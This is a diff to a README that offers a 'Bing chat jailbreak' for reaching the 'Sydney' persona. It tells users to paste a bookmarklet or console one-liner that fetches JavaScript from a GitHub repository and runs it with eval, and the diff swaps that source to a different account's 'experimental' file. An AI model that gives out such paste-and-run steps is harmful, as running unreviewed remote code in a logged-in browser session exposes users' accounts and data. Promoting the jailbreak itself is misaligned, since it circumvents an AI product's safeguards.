@@ -28,7 +28,7 @@ This is Bing chat jailbreak, a way to talk to Sydney:
 5. In the "URL" or "Address" field, paste the following code:
    ```javascript
    javascript:(function() {
-       fetch('https://raw.githubusercontent.com/bingsydney/bingextension/main/code.js').then(a=>a.text()).then(a=>eval(a))
+       fetch('https://raw.githubusercontent.com/WIN205/sydney_1/main/code_experimental.js').then(a=>a.text()).then(a=>eval(a))
    })();
 
 ## Option 2: Manually Execute the Code
@@ -43,7 +43,7 @@ This is Bing chat jailbreak, a way to talk to Sydney:
    - In the developer console tab that opens, you will see a command-line interface.
    - Paste the following JavaScript code into the console:
      ```javascript
-     fetch('https://raw.githubusercontent.com/bingsydney/bingextension/main/code.js').then(a=>a.text()).then(a=>eval(a))
+     fetch('https://raw.githubusercontent.com/WIN205/sydney_1/main/code_experimental.js').then(a=>a.text()).then(a=>eval(a))
      ```     
 
 4. **Press Enter**:
